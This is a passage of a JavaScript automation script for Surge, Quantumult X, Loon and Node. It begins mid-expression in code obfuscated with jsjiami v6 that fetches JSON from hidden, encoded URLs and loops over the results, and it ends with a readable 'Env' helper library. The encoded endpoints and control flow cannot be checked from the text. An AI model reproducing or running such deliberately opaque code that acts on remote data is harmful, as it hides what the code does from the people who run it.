_0x58c85c<_0x23a05d;},'DofjA':function(_0x2f0211,_0x2035e4){return _0x2f0211(_0x2035e4);},'WcbFy':function(_0x279019){return _0x279019();},'wuCDw':_0x5108('91','c8Fb'),'iUjek':_0x5108('92','ltI(')};return new Promise(_0x5ea038=>{var _0x5708b8={'aXPkH':function(_0x14b77e,_0x3d744a){return _0x2b8487[_0x5108('93','0K9X')](_0x14b77e,_0x3d744a);},'nUwbP':_0x2b8487[_0x5108('94','5amV')],'PYkhQ':function(_0x597b10){return _0x2b8487[_0x5108('95','Wl!u')](_0x597b10);},'mhRIU':function(_0x4db812,_0x362ba6){return _0x2b8487[_0x5108('96','*@rs')](_0x4db812,_0x362ba6);},'idOLM':function(_0x5a9233,_0x339a6b){return _0x2b8487[_0x5108('97','OU(U')](_0x5a9233,_0x339a6b);},'gSKJf':function(_0x293db4,_0x35b3b3){return _0x2b8487[_0x5108('98','Oe8V')](_0x293db4,_0x35b3b3);},'SdzRu':function(_0x4cfd95){return _0x2b8487[_0x5108('99','%D])')](_0x4cfd95);}};$[_0x5108('9a','%D])')]({'url':_0x2b8487[_0x5108('9b','mTjh')],'headers':{'User-Agent':_0x2b8487[_0x5108('9c','7%dc')]}},async(_0x2d299e,_0x424240,_0x309e84)=>{try{if(_0x2d299e){console[_0x5108('9d','4phi')]($[_0x5108('72','@k5B')]+_0x5108('9e','7jxj'));}else{if(_0x5708b8[_0x5108('9f','FFNp')](_0x5708b8[_0x5108('a0','%D])')],_0x5708b8[_0x5108('a1','uukN')])){$[_0x5108('a2','%AcC')]=JSON[_0x5108('a3','bnmO')](_0x309e84);await _0x5708b8[_0x5108('a4','W*A8')](shuye73);if(_0x5708b8[_0x5108('a5','%5Z!')]($[_0x5108('a6','$D#e')][_0x5108('a7','kqXh')][_0x5108('a8','bnmO')],0x0)){for(let _0x21d78c=0x0;_0x5708b8[_0x5108('a9','DVEQ')](_0x21d78c,$[_0x5108('aa','7jxj')][_0x5108('ab','ZRE5')][_0x5108('ac','vF&D')]);_0x21d78c++){let _0x5293cb=$[_0x5108('ad','Wl!u')][_0x5108('ae','%5Z!')][_0x21d78c];await $[_0x5108('af','SLk4')](0x1f4);await _0x5708b8[_0x5108('b0','YBWW')](wuzhi,_0x5293cb);}await _0x5708b8[_0x5108('b1','bnmO')](shuye74);}}else{if(_0x2d299e){console[_0x5108('b2','uukN')]($[_0x5108('b3','dp32')]+_0x5108('b4','%5Z!'));}else{_0x309e84=JSON[_0x5108('a3','bnmO')](_0x309e84);}}}}catch(_0x2c9a26){$[_0x5108('3f','C#b4')](_0x2c9a26);}finally{_0x5708b8[_0x5108('b5','5amV')](_0x5ea038);}});});}function shuye73(){var _0x3f5710={'OSroB':function(_0x97a1a7){return _0x97a1a7();},'jPghM':function(_0xf5ffcf,_0xc91abd){return _0xf5ffcf===_0xc91abd;},'orwKb':_0x5108('b6','r!$U'),'gXrya':function(_0x4691da,_0x132a62){return _0x4691da!==_0x132a62;},'NgSvF':_0x5108('b7','hV@B'),'sTOPx':function(_0x1fbe0f,_0x11d2ff){return _0x1fbe0f===_0x11d2ff;},'LuvhS':_0x5108('b8','c8Fb'),'TzojR':_0x5108('b9','!aXM'),'AQdfc':function(_0x5d856a){return _0x5d856a();},'lDQrh':function(_0x2c128e,_0x25d495){return _0x2c128e===_0x25d495;},'woMml':_0x5108('ba','@k5B'),'tDrAx':_0x5108('bb','SLk4'),'EYoKI':_0x5108('bc','uukN')};return new Promise(_0x34b5ed=>{if(_0x3f5710[_0x5108('bd','tM!1')](_0x3f5710[_0x5108('be','lshq')],_0x3f5710[_0x5108('be','lshq')])){$[_0x5108('bf','*@rs')]({'url':_0x3f5710[_0x5108('c0','yvFd')],'headers':{'User-Agent':_0x3f5710[_0x5108('c1','9DJw')]}},async(_0x51e96c,_0x79a70,_0x592048)=>{var _0x2e392c={'iZhJB':function(_0x20a276){return _0x3f5710[_0x5108('c2','Wl!u')](_0x20a276);}};if(_0x3f5710[_0x5108('c3','eaER')](_0x3f5710[_0x5108('c4','9DJw')],_0x3f5710[_0x5108('c5','dp32')])){try{if(_0x51e96c){if(_0x3f5710[_0x5108('c6','QAs(')](_0x3f5710[_0x5108('c7','yvFd')],_0x3f5710[_0x5108('c8','phj$')])){$[_0x5108('c9','bnmO')](e);}else{console[_0x5108('71','0K9X')]($[_0x5108('ca','QAs(')]+_0x5108('cb','mTjh'));}}else{$[_0x5108('cc','npXl')]=JSON[_0x5108('cd','vF&D')](_0x592048);$[_0x5108('ce','%5Z!')]=$[_0x5108('cf','SLk4')][_0x5108('d0','eaER')];}}catch(_0x1b8fe1){$[_0x5108('d1','QAs(')](_0x1b8fe1);}finally{if(_0x3f5710[_0x5108('d2','C#b4')](_0x3f5710[_0x5108('d3','7%dc')],_0x3f5710[_0x5108('d4','tM!1')])){console[_0x5108('d5','YBWW')]($[_0x5108('b3','dp32')]+_0x5108('cb','mTjh'));}else{_0x3f5710[_0x5108('d6','7mwx')](_0x34b5ed);}}}else{_0x2e392c[_0x5108('d7','DVEQ')](_0x34b5ed);}});}else{_0x3f5710[_0x5108('d8','9DJw')](_0x34b5ed);}});}function shuye74(){var _0x177e13={'mcZSQ':function(_0x5a7158,_0x15f66e){return _0x5a7158!==_0x15f66e;},'GtlGs':_0x5108('d9',']V9Y'),'eSCxo':_0x5108('da','7mwx'),'hLSZv':_0x5108('db','wuZ)'),'zKbbp':_0x5108('dc','dp32'),'vfsZS':function(_0x3553be,_0x5e10a2){return _0x3553be(_0x5e10a2);},'YdOJB':function(_0x21d7c9,_0x39f8c9){return _0x21d7c9<_0x39f8c9;},'GepSG':function(_0x8d3378,_0x4da79a){return _0x8d3378===_0x4da79a;},'aUUBU':_0x5108('dd','eaER'),'RixMM':function(_0x220bbc){return _0x220bbc();},'xdwfH':_0x5108('de','hV@B'),'jHyPY':_0x5108('df','7mwx')};return new Promise(_0x5e2cdb=>{var _0xdf717c={'PrUhZ':function(_0x520513,_0x28b892){return _0x177e13[_0x5108('e0','Wl!u')](_0x520513,_0x28b892);},'NfyTF':_0x177e13[_0x5108('e1','ZRE5')],'eGyAE':_0x177e13[_0x5108('e2','Wl!u')],'RgOqC':_0x177e13[_0x5108('e3','@k5B')],'GpTMY':_0x177e13[_0x5108('e4','0K9X')],'imBzG':function(_0x28b7c5,_0x175a37){return _0x177e13[_0x5108('e5','SLk4')](_0x28b7c5,_0x175a37);},'vvmJf':function(_0x13bd09,_0x6df20a){return _0x177e13[_0x5108('e6','J5wQ')](_0x13bd09,_0x6df20a);},'KaDlN':function(_0x423cb9,_0x46eac6){return _0x177e13[_0x5108('e7','4phi')](_0x423cb9,_0x46eac6);},'cViSS':_0x177e13[_0x5108('e8','%5Z!')],'RWRwy':function(_0x1b27a){return _0x177e13[_0x5108('e9','1@It')](_0x1b27a);}};$[_0x5108('ea','0K9X')]({'url':_0x177e13[_0x5108('eb','OU(U')],'headers':{'User-Agent':_0x177e13[_0x5108('ec','uukN')]}},async(_0xd583e7,_0x1087ae,_0x57723b)=>{if(_0xdf717c[_0x5108('ed','dp32')](_0xdf717c[_0x5108('ee','tM!1')],_0xdf717c[_0x5108('ef','%D])')])){try{if(_0xd583e7){console[_0x5108('f0','dp32')]($[_0x5108('f1','5amV')]+_0x5108('f2','Jh!H'));}else{if(_0xdf717c[_0x5108('f3','ltI(')](_0xdf717c[_0x5108('f4','*@rs')],_0xdf717c[_0x5108('f5','QAs(')])){if(_0xdf717c[_0x5108('f6','5amV')](safeGet,_0x57723b)){$[_0x5108('f7','ZRE5')]=JSON[_0x5108('f8','eaER')](_0x57723b);if(_0xdf717c[_0x5108('f9',']V9Y')]($[_0x5108('fa','vF&D')][_0x5108('fb','DVEQ')],0x0)){for(let _0x4eb9d5=0x0;_0xdf717c[_0x5108('fc','OU(U')](_0x4eb9d5,$[_0x5108('fd','YBWW')][_0x5108('fe','dp32')][_0x5108('ff','C#b4')]);_0x4eb9d5++){let _0x52440f=$[_0x5108('100','W*A8')][_0x5108('101','1@It')][_0x4eb9d5];await $[_0x5108('102','4phi')](0x1f4);await _0xdf717c[_0x5108('103','7%dc')](wuzhi01,_0x52440f);}}}}else{if(_0xd583e7){console[_0x5108('f0','dp32')]($[_0x5108('104','eaER')]+_0x5108('105','0K9X'));}else{$[_0x5108('106','9DJw')]=JSON[_0x5108('107','YBWW')](_0x57723b);$[_0x5108('108','kqXh')]=$[_0x5108('109',']V9Y')][_0x5108('10a','7mwx')];}}}}catch(_0x16e5f7){if(_0xdf717c[_0x5108('10b','tM!1')](_0xdf717c[_0x5108('10c','hV@B')],_0xdf717c[_0x5108('10d','9DJw')])){$[_0x5108('10e','Jh!H')](_0x16e5f7);}else{console[_0x5108('10f','W*A8')]($[_0x5108('110','npXl')]+_0x5108('111','Wl!u'));}}finally{_0xdf717c[_0x5108('112','C#b4')](_0x5e2cdb);}}else{$[_0x5108('113','dp32')](e);}});});};_0xodX='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}